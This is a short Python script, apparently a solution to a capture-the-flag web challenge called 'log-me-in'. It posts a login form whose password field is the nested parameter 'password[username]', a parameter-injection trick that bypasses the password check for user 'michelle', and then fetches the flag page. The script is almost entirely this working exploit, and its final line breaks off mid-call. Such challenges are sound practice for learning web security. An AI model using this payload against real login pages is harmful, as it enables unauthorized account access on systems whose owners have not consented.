import requests
from bs4 import BeautifulSoup
url ="https://log-me-in.web.ctfcompetition.com/"

session = requests.session()

data={"username" : "michelle" , "password[username]" : ""}
respond = session.post(url + "login", data=data)
content =BeautifulSoup(respond.text,'lxml').prettify()
print(session.get(url+"flag").text)
session.close(
